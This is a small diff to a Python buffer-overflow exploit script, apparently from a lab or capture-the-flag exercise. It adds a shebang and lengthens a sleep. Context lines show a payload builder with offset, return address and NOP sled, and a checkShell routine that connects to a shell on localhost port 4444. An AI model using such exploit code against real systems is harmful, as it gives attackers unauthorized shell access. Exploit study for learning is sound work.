@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import time
 import struct
 import sys
@@ -61,7 +63,7 @@ def makeExploit(offset, address, buf_size=128, nop=b' '):
     return exploit
 
 def checkShell():
-    time.sleep(0.1)
+    time.sleep(0.5)
     try:
         ioShell = remote("127.0.0.1", 4444)
         ioShell.interactive()
